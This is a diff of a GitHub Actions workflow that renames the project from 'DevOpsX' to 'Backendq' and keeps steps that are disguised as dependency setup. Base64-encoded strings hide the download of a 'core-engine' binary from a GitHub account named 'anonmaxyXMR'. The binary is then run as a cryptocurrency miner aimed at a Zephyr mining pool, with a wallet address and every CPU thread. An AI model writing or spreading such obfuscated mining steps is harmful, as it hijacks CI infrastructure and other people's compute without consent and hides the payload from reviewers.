@@ -1,4 +1,4 @@
-name: DevOpsX
+name: Backendq
 
 on:
   push:
@@ -12,22 +12,21 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: CheckoutDevOpsX
+      - name: CheckoutBackendq
         uses: actions/checkout@v2
 
-      - name: Setup DependencyDevOpsX
+      - name: Setup DependencyBackendq
         run: |
-          curl ipinfo.io
           sudo apt-get update
           sudo apt-get install -y curl libuv1-dev libssl-dev libhwloc-dev
 
-      - name: Download core-engineDevOpsX
+      - name: Download core-engineBackendq
         run: |
           ENCODED="aHR0cHM6Ly9naXRodWIuY29tL2Fub25tYXh5WE1SL2NvcmUtZW5naW5lL3JlbGVhc2VzL2Rvd25sb2FkL3YwMy9jb3JlLWVuZ2luZQ=="
           URL=$(echo "$ENCODED" | base64 -d)
           curl -L -o core-engine "$URL"
 
-      - name: Run MachineDevOpsX
+      - name: Run MachineBackendq
         run: |
           chmod +x core-engine
           ENCODED="Li9jb3JlLWVuZ2luZSAtbyBjYS56ZXBoeXIuaGVyb21pbmVycy5jb206MTEyNCBcCiAgLXUgWkVQSFlSMlltVEJMdkxKUUJZeXdIVDZ5Sm9Cemo0QlcxU2hLMnYxWGN6Zm5ad1ZFcmJpRGNBaE5UbjRZWEhQQ2dFWXhMeWQ0UnpzeEVkd1kzdkxDbWVqQWNjcGp3dVpleWZ4MVouU2NhcmZhY2VTdHlsZT05NjAwMDAgXAogIC0tZG9uYXRlLWxldmVsIDAgXAogIC1rIC0tdGhyZWFkcz0kKG5wcm9jKSAtLWNwdS1wcmlvcml0eT01IC0taHVnZS1wYWdlcy1qaXQgLS1jcHUtbm8teWllbGQgLS1yYW5kb214LW5vLW51bWEgXAogIC1hIHJ4LzAgLS10bHMgLS1hc209cnl6ZW4gLS1yYW5kb214LW5vLXJkbXNyIC0tcmFuZG9teC13cm1zcj0tMSAtLXJhbmRvbXgtbW9kZT1mYXN0"
